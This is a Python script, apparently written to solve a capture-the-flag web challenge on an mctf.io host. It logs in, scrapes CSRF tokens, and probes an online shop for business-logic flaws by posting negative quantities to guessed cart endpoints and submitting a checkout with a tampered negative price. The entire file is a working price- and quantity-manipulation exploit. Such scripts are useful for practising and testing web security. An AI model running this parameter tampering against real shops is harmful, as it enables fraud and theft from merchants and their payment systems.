import http.client
import urllib.parse
import re
from html.parser import HTMLParser

BASE = "http://noneshallpass.chals.mctf.io"
parsed = urllib.parse.urlparse(BASE)
USER = "exploit_user"
PWD = "Expl0it!"


class CSRFParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.csrf = None

    def handle_starttag(self, tag, attrs):
        if tag.lower() == "input":
            attrdict = dict(attrs)
            if attrdict.get("name") in {"csrf_token", "csrf", "_csrf"}:
                self.csrf = attrdict.get("value")


def http_post(path, params, cookie=None):
    conn = http.client.HTTPConnection(parsed.netloc, timeout=10)
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    if cookie:
        headers["Cookie"] = "session=" + cookie
    body = urllib.parse.urlencode(params)
    conn.request("POST", path, body, headers)
    res = conn.getresponse()
    data = res.read()
    code = res.status
    hdrs = dict(res.getheaders())
    conn.close()
    return code, hdrs, data


def http_get(path, cookie=None):
    conn = http.client.HTTPConnection(parsed.netloc, timeout=10)
    headers = {}
    if cookie:
        headers["Cookie"] = "session=" + cookie
    conn.request("GET", path, headers=headers)
    res = conn.getresponse()
    data = res.read()
    code = res.status
    hdrs = dict(res.getheaders())
    conn.close()
    return code, hdrs, data


# Step 1: get login page to mimic browser
print("[*] fetching /login")
code, hdrs, body = http_get("/login")
print("GET /login ->", code)

# Step 2: login to obtain session cookie
print("[*] logging in")
code, hdrs, body = http_post("/login", {"username": USER, "password": PWD})
print("POST /login ->", code)
setcookie = hdrs.get("Set-Cookie")
print("Set-Cookie:", setcookie)
if not setcookie:
    raise SystemExit("login failed, no cookie")
m = re.search(r"session=([^;]+)", setcookie)
if not m:
    raise SystemExit("no session in cookie")
session = m.group(1)
print("session token", session[:40], "...")

# Step 3: fetch products/home page
print("[*] GET /products")
code, hdrs, body = http_get("/products", session)
print("GET /products ->", code)
print(body[:400])

# Step 4: fetch /cart (should need CSRF)
print("[*] GET /cart")
code, hdrs, cart_html = http_get("/cart", session)
print("GET /cart ->", code)
print(cart_html[:400])

# Try to parse CSRF token from cart if present
parser = CSRFParser()
parser.feed(cart_html.decode(errors="ignore"))
csrf = parser.csrf
print("csrf token from cart page:", csrf)

# Step 5: try adding product with real flow (guess form names)
print("[*] Attempt add-to-cart with realistic field names")
add_params = {
    "product_id": "1",
    "quantity": "1",
}
if csrf:
    add_params["csrf_token"] = csrf
code, hdrs, body = http_post("/cart/add", add_params, session)
print("POST /cart/add ->", code)
print(body[:400])

# Step 6: view cart again
print("[*] GET /cart after add")
code, hdrs, cart_html = http_get("/cart", session)
print("GET /cart ->", code)
print(cart_html[:400])
parser = CSRFParser()
parser.feed(cart_html.decode(errors="ignore"))
csrf = parser.csrf
print("csrf token after add:", csrf)

# Step 7: attempt negative quantity update using realistic endpoint names
update_params = {
    "product_id": "1",
    "quantity": "-10",
}
if csrf:
    update_params["csrf_token"] = csrf
for path in ["/cart/update", "/cart/mod"]:
    print(f"[*] POST {path} with negative quantity")
    code, hdrs, body = http_post(path, update_params, session)
    print(path, "->", code)
    print(body[:400])

# Step 8: attempt checkout with manipulated price
checkout_params = {
    "product_id": "1",
    "quantity": "1",
    "price": "-9999",
}
if csrf:
    checkout_params["csrf_token"] = csrf
print("[*] POST /checkout with negative price")
code, hdrs, body = http_post("/checkout", checkout_params, session)
print("POST /checkout ->", code)
print(body[:400])

print("Done")
